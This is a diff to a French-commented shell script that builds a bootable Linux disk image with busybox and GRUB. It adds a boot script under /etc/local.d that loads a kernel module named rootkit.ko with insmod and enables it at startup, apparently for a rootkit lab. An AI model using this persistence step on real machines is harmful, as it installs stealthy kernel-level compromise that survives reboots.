@@ -98,6 +98,24 @@ if [ ! -f "$ROOTFS_DIR/bin/sh" ]; then
 fi
 
 ########################################
+# Vérification et ajout des fichiers essentiels
+########################################
+
+echo "Vérification et ajout des fichiers essentiels..."
+if [ ! -f "$ROOTFS_DIR/bin/sh" ]; then
+    sudo cp /bin/busybox "$ROOTFS_DIR/bin/sh"
+    echo "Fichier /bin/sh manquant, busybox copié comme remplacement."
+fi
+
+echo "Ajout des bibliothèques nécessaires pour /bin/sh..."
+for lib in $(ldd /bin/sh | awk '{print $3}' | grep -v ^$); do
+    sudo cp --parents "$lib" "$ROOTFS_DIR"
+done
+
+echo "Test de /bin/sh dans l'image..."
+sudo chroot "$ROOTFS_DIR" /bin/sh -c "echo 'Test réussi!'"
+
+########################################
 #       Copie du noyau et rootkit      #
 ########################################
 
@@ -128,17 +146,20 @@ EOF
 
 grub-install --directory="$GRUB_DIR" --boot-directory="$ROOTFS_DIR/boot" "$LOOP_DEVICE"
 
+########################################
+#      Script d'exécution rootkit       #
+########################################
 echo "Ajout d'un script de démarrage pour le rootkit..."
-sudo mkdir -p "$ROOTFS_DIR/etc/local.d"
-cat <<'EOF' | sudo tee "$ROOTFS_DIR/etc/local.d/rootkit.start" > /dev/null
+sudo mkdir -p $ROOTFS_DIR/etc/local.d
+cat <<'EOF' | sudo tee $ROOTFS_DIR/etc/local.d/rootkit.start
 #!/bin/sh
+echo "Insertion du rootkit compilé..."
 insmod /home/user/rootkit.ko
 EOF
-sudo chmod +x "$ROOTFS_DIR/etc/local.d/rootkit.start"
+sudo chmod +x $ROOTFS_DIR/etc/local.d/rootkit.start
 
 echo "Activation du service 'local' au démarrage..."
-sudo chroot "$ROOTFS_DIR" sh -c "rc-update add local default"
-
+sudo chroot $ROOTFS_DIR /bin/sh -c "rc-update add local default"
 
 ########################################
 #          Nettoyage                   #
